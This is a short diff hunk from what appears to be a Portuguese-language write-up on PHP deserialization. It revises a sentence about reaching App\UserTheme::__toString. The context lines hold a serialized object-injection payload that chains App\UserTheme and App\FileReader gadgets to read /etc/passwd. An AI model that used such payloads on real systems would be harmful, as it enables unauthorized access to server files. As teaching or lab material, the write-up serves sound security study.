@@ -436,7 +436,7 @@ O:13:"App\UserTheme":1:{s:11:"extraThemes"%3BO:14:"App\FileReader":1:{s:8:"fileN
 ame"%3Bs:11:"/etc/passwd"%3B}}
 ```
 
-Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`:
+Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`, alcançando a injeção de objeto via via um gadget.
 
 ```php
 class FileReader {
